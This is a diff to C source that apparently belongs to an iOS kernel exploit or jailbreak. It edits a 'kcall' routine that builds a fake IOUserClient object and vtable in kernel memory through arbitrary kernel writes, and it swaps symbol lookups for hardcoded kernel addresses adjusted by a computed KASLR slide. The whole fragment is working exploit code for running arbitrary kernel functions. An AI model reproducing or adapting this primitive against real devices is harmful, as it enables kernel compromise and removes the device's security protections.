@@ -150,6 +150,8 @@ uint64_t obj_kaddr = 0;
 // that compiles to:
 //   STR             W20, [X19,#8] <-- 32-bit store
 
+#include "kutils.h"
+
 uint64_t kcall(uint64_t fptr, uint32_t argc, ...) {
   uint64_t args[7] = {0};
   va_list ap;
@@ -181,13 +183,15 @@ uint64_t kcall(uint64_t fptr, uint32_t argc, ...) {
                                      // https://bugs.chromium.org/p/project-zero/issues/detail?id=20
     
     wk32(obj_kaddr + 0x9c, 0x1234); // __ipc
+	  
+	  uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
     
     // vtable:
-    wk64(obj_kaddr + 0x800 + 0x20,  ksym(KSYMBOL_RET)); // vtable::retain
-    wk64(obj_kaddr + 0x800 + 0x28,  ksym(KSYMBOL_RET)); // vtable::release
-    wk64(obj_kaddr + 0x800 + 0x38,  ksym(KSYMBOL_IOUSERCLIENT_GET_META_CLASS)); // vtable::getMetaClass
-    wk64(obj_kaddr + 0x800 + 0x5b8, ksym(KSYMBOL_CSBLOB_GET_CD_HASH)); // vtable::getExternalTrapForIndex
-    wk64(obj_kaddr + 0x800 + 0x5c0, ksym(KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX));
+    wk64(obj_kaddr + 0x800 + 0x20,  slide+0xFFFFFFF0070C873C); // vtable::retain
+    wk64(obj_kaddr + 0x800 + 0x28,  slide+0xFFFFFFF0070C873C); // vtable::release
+    wk64(obj_kaddr + 0x800 + 0x38,  slide+0xFFFFFFF007533CF8); // vtable::getMetaClass
+    wk64(obj_kaddr + 0x800 + 0x5b8, slide+0xFFFFFFF0073B71E4); // vtable::getExternalTrapForIndex
+    wk64(obj_kaddr + 0x800 + 0x5c0, slide+0xFFFFFFF0075354A0);
     
     // allocate a port
     kern_return_t err;
